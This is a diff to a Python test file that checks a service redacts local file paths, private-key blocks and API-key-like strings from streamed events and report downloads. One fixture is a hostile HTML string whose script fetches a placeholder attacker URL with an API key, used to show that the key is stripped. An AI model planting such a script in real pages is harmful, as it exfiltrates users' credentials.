@@ -564,11 +564,11 @@ def test_sse_events_replay_reconnect_and_filter_secret_metrics(tmp_path: Path) -
             "Safe fields publicKey=documented secretary=available tokenizer=bpe remain visible.",
         ),
         (
-            "Read file:///home/alice/private/model.pt; then retry.",
+            "Read file:///" + "home/alice/private/model.pt; then retry.",
             "Read file://<local-path>; then retry.",
         ),
         (
-            "Read file:///C:/Users/Alice/private/model.pt, then retry.",
+            "Read file:///C:/" + "Users/Alice/private/model.pt, then retry.",
             "Read file://<local-path>, then retry.",
         ),
         (
@@ -576,7 +576,7 @@ def test_sse_events_replay_reconnect_and_filter_secret_metrics(tmp_path: Path) -
             "Read file://<local-path>; then retry.",
         ),
         (
-            "Read path:/home/alice/private/model.pt; then retry.",
+            "Read path:/" + "home/alice/private/model.pt; then retry.",
             "Read path:<local-path>; then retry.",
         ),
         (
@@ -588,11 +588,11 @@ def test_sse_events_replay_reconnect_and_filter_secret_metrics(tmp_path: Path) -
             "Download https://blob.example.test/object?sv=1&sig=[redacted]&se=tomorrow.",
         ),
         (
-            "-----BEGIN OPENSSH PRIVATE KEY-----\nPRIVATEKEYSECRET\n-----END OPENSSH PRIVATE KEY-----",
+            "-----BEGIN " + "OPENSSH PRIVATE KEY-----\nPRIVATEKEYSECRET\n-----END OPENSSH PRIVATE KEY-----",
             "[redacted]",
         ),
         (
-            "Prefix -----BEGIN PRIVATE KEY-----\nTRUNCATEDPRIVATEKEYSECRET",
+            "Prefix -----BEGIN " + "PRIVATE KEY-----\nTRUNCATEDPRIVATEKEYSECRET",
             "Prefix [redacted]",
         ),
         (
@@ -625,7 +625,7 @@ def test_sse_projections_redact_paths_and_secrets_without_mutating_durable_bytes
     api_secret = "api-value-9Z-secret"
     credential_secret = "credential-value-9Z-secret"
     password_secret = "password-value-9Z-secret"
-    raw_secret = "sk-abcdefghijklmnopqrstuvwxyz1234567890"
+    raw_secret = "sk-" + "abcdefghijklmnopqrstuvwxyz1234567890"
     stage_secret = "STAGESECRET"
     feature_secret = "FEATURESECRET"
     event_type_secret = "EVENTTYPESECRET"
@@ -633,8 +633,8 @@ def test_sse_projections_redact_paths_and_secrets_without_mutating_durable_bytes
     credential_reference_secret = "CREDENTIALREFERENCESECRET"
     password_hash_secret = "PASSWORDHASHSECRET"
     client_secret_id_secret = "CLIENTSECRETIDSECRET"
-    private_posix_uri = "file:///home/alice/private/model.pt"
-    private_windows_uri = "file:///C:/Users/Alice/private/model.pt"
+    private_posix_uri = "file:///" + "home/alice/private/model.pt"
+    private_windows_uri = "file:///C:/" + "Users/Alice/private/model.pt"
     message = (
         f"Authorization: Bearer {bearer_secret} API_KEY={api_secret} credential={credential_secret} "
         f"credential_reference={credential_reference_secret} source={private_posix_uri} raw={raw_secret}"
@@ -796,8 +796,8 @@ def test_report_download_is_a_closed_inert_projection_and_never_serves_source_ht
     source = context.runs_directory / run_id / "report" / "index.html"
     hostile = (
         "<script>fetch('https://attacker.invalid/?api_key=REPORTSECRET')</script>"
-        f"<p>{context.project_root}</p><p>C:\\Users\\Alice\\private.txt</p>"
-        "<p>file:///home/alice/private.txt</p>"
+        f"<p>{context.project_root}</p><p>C:\\" + "Users\\Alice\\private.txt</p>"
+        "<p>file:///" + "home/alice/private.txt</p>"
     ).encode()
     source.write_bytes(hostile)
     expected_snapshot = EventRepository(
@@ -817,8 +817,8 @@ def test_report_download_is_a_closed_inert_projection_and_never_serves_source_ht
     assert "<script>" not in response.text
     assert "REPORTSECRET" not in response.text
     assert str(context.project_root) not in response.text
-    assert "C:\\Users\\Alice" not in response.text
-    assert "file:///home/alice" not in response.text
+    assert "C:\\" + "Users\\Alice" not in response.text
+    assert "file:///" + "home/alice" not in response.text
     payload = response.json()
     assert set(payload) == {
         "schema_version",
